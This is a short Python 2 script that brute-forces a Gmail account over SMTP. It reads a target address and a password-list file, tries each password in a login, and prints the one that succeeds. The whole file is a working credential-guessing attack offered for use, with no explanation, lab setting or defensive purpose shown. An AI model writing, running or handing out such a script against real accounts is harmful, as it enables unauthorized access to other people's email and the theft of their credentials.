import smtplib


smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.starttls()
user = raw_input(" enter email ")
passwfile = raw_input(" passfile? ")
passwfile = open(passwfile, "r")

for password in passwfile:
  try:
      smtpserver.login(user, password)
      print "Password is:  " + password

  except smtplib.SMTPAuthenticationError:
   var = 1
